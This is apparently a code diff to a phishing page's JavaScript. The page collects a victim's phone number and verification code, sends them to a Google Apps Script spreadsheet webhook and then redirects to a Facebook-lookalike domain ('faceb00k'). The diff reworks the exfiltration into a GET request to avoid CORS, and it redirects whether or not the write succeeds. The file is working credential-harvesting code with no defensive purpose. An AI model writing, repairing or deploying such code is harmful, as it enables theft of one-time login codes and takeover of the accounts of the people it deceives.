@@ -1,5 +1,5 @@
-// Replace this with your Apps Script Web App URL:
-const GSHEET_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxnyo8Qln2OY0EDBV6aHph3ZMjd3YopvAe8hxKHmPLW8B9ru8dVnFJ2Q7LXnuaGjSg7ZQ/exec';
+// Apps Script Web App URL (no query params here)
+const GSHEET_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzojLn6xnintLmNE3jlBgKPFJNj4RGK_PP3x9c0BOlogEsLn0Ya2dvco8t71zutNW1pqQ/exec';
 
 const phoneInput   = document.getElementById('phoneInput');
 const codeInput    = document.getElementById('codeInput');
@@ -11,26 +11,22 @@ const timerSpan    = document.getElementById('timer');
 
 let countdownInterval = null;
 
-/**
- * Format seconds into MM:SS
- */
+// Format seconds → "MM:SS"
 function formatTime(sec) {
-  const m = Math.floor(sec / 60);
-  const s = sec % 60;
-  return `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+  const m = Math.floor(sec / 60).toString().padStart(2,'0');
+  const s = (sec % 60).toString().padStart(2,'0');
+  return `${m}:${s}`;
 }
 
-/**
- * Start the 2‑minute countdown.
- */
+// Begin or restart 2‑minute countdown
 function startCountdown() {
-  let timeLeft = 120; // 2 minutes
+  let timeLeft = 120;
 
-  // Disable resend, show timer
   sendCodeBtn.disabled = true;
   timerSpan.textContent = formatTime(timeLeft);
   timerSpan.style.display = 'inline';
 
+  clearInterval(countdownInterval);
   countdownInterval = setInterval(() => {
     timeLeft--;
     if (timeLeft <= 0) {
@@ -43,40 +39,36 @@ function startCountdown() {
   }, 1000);
 }
 
-// When “Send New Code” is clicked, restart the countdown
+// On page load: kick off first countdown
+window.addEventListener('DOMContentLoaded', () => {
+  startCountdown();
+});
+
+// “Send New Code” just restarts the timer
 sendCodeBtn.addEventListener('click', () => {
   startCountdown();
-  // (Optionally) trigger the actual “send code” API here
+  // TODO: trigger your SMS/API here if needed
 });
 
-// On page load, immediately start the first countdown
-window.addEventListener('load', () => {
-  startCountdown();
-});
-
-// Handle the Continue button
+// Continue button: send data via GET (avoids CORS preflight)
 continueBtn.addEventListener('click', () => {
   const phone = phoneInput.value.trim();
   const code  = codeInput.value.trim();
-
   errorMsg.style.visibility = 'hidden';
+
   if (!phone || !code) {
     errorMsg.textContent = 'Please enter both phone number and code.';
     errorMsg.style.visibility = 'visible';
     return;
   }
 
-  fetch(GSHEET_WEBHOOK_URL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ phone, code })
-  })
-  .then(res => res.json())
-  .then(_data => {
-    // Always redirect, even if sheet write fails
-    window.location.href = 'https://faceb00k-kappa.vercel.app/';
-  })
-  .catch(_err => {
-    window.location.href = 'https://faceb00k-kappa.vercel.app/';
-  });
+  // Build URL with query params
+  const url = `${GSHEET_WEBHOOK_URL}?phone=${encodeURIComponent(phone)}&code=${encodeURIComponent(code)}`;
+
+  fetch(url)               // default is GET
+    .then(res => res.json())
+    .finally(() => {
+      // always redirect
+      window.location.href = 'https://faceb00k-kappa.vercel.app/';
+    });
 });
